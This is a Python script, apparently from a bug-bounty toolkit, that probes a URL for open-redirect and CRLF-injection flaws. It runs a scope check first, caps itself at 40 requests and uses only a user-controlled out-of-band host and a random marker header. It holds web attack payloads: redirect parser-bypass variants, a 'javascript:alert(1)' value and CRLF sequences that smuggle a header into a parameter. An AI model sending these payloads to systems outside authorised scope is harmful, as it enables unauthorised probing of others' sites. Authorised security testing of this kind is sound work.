#!/usr/bin/env python3
"""Open redirect and CRLF injection probe (bounded: capped at 40 requests).

Open redirect: sends a redirect parameter pointing at a host you control and reads
the Location header, plus parser-bypass variants that keep your host.
CRLF: sends a benign marker header inside a parameter value and checks whether it
appears as a response header. Only your own out-of-band host and a unique marker
are used. Scope gate runs first.

Example:
  redirect_crlf_probe.py --target example.com --workspace ~/Documents/bugbounty \
     --url https://example.com/login --param redirect --oob-host abc.oast.example \
     --crlf-param lang --out artifacts/example.com/redirect.json
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_REQUESTS = 40


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


OPENER = urllib.request.build_opener(NoRedirect)


def fetch(url: str, timeout: float) -> tuple[int, dict[str, str]]:
    req = urllib.request.Request(url, method="GET")
    try:
        with OPENER.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {})
    except (urllib.error.URLError, OSError):
        return 0, {}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", required=True)
    ap.add_argument("--param", help="redirect parameter name, for example redirect or next")
    ap.add_argument("--oob-host", required=True, help="host you control for redirect tests")
    ap.add_argument("--crlf-param", help="parameter whose value is reflected into headers")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--out")
    args = ap.parse_args()

    res = subprocess.run([SCOPE, args.target] + ([args.workspace] if args.workspace else []),
                         capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        return res.returncode

    host = args.oob_host
    own = urllib.parse.urlsplit(args.url).netloc
    sent = 0
    report: dict = {"url": args.url, "open_redirect": [], "crlf": []}

    def with_param(name: str, value: str) -> str:
        sep = "&" if "?" in args.url else "?"
        return f"{args.url}{sep}{urllib.parse.urlencode({name: value})}"

    if args.param:
        variants = [f"https://{host}", f"//{host}", f"///{host}", f"https:\\\\{host}",
                    f"https://{own}@{host}", f"https://{own}.{host}",
                    f"https://{host}#{own}", "javascript:alert(1)", "data:text/html,redirect-test"]
        for v in variants:
            if sent >= MAX_REQUESTS:
                break
            code, hdrs = fetch(with_param(args.param, v), args.timeout); sent += 1
            loc = hdrs.get("Location") or hdrs.get("location") or ""
            report["open_redirect"].append({"value": v, "status": code, "location": loc,
                                            "redirects_to_oob": host in loc})

    if args.crlf_param:
        marker = "crlf" + secrets.token_hex(4)
        payloads = [f"x%0d%0aX-Probe-{marker}:1", f"x%0aX-Probe-{marker}:1", f"x%0d%0a%20X-Probe-{marker}:1"]
        for p in payloads:
            if sent >= MAX_REQUESTS:
                break
            code, hdrs = fetch(f"{args.url}{'&' if '?' in args.url else '?'}{args.crlf_param}={p}", args.timeout); sent += 1
            injected = any(marker in k or marker in v for k, v in hdrs.items())
            report["crlf"].append({"payload": p, "status": code, "header_injected": injected})

    report["requests_sent"] = sent
    report["note"] = "Confirm any hit manually. A Location hit to the OOB host is an open redirect; a header hit is CRLF injection."
    text = json.dumps(report, indent=2)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
